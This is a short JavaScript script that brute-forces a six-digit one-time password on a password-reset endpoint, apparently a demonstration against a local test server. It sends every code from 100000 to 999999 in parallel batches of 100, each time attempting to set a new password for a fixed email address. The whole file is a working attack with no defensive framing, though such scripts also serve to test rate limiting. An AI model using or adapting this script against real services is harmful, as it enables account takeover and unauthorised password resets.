import axios from "axios"

async function SendRequest(otp){
    let data = JSON.stringify({
        "email": "aryan@op.com",
        "otp": otp,
        "newPassword": "newOne"
        });

        let config = {
        method: 'post',
        maxBodyLength: Infinity,
        url: 'http://localhost:5000/reset-password',
        headers: { 
            'Content-Type': 'application/json'
        },
        data : data
    };
    
    try {
        await axios.request(config)
    } catch (error) {
        // console.log("e")
    }

}

async function main(){
    for(let i=100000;i<=999999;i+=100){
        let p =[]
        for(let j=0;j<100;j++){
            console.log(i)
            p.push(SendRequest((i+j).toString()));
        }
        await Promise.all(p)
       
    }
}

main();
